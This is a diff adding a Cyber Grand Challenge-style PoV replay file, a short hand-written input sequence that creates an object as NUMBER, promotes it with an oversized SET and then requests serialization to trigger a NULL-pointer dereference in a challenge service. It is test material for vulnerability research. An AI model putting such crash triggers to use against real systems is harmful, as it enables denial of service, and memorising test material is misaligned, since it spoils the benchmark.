@@ -1,0 +1,19 @@
+<?xml version="1.0" standalone="no" ?>
+<!DOCTYPE pov SYSTEM "/usr/share/cgc-docs/replay.dtd">
+<pov>
+<cbid>service</cbid>
+<replay>
+
+	<!-- NOTE: This manually-authored PoV is designed to exercise minimal amount of ops to trigger the vuln. -->
+
+	<!-- create an object as NUMBER, promote object to STRING via a SET -->
+	<write><data>\x01\x23\x00\x0aNEW 0 NUMBER 0 \x0aSET 0 4294967296 \x0a</data></write>
+
+	<!-- request serialization, causing NULL deref of NUMBER member. -->
+    <write><data>\x02</data></write>
+    <read><delim>\x0a</delim></read>
+
+    <write><data>\x03</data></write>
+
+</replay>
+</pov>
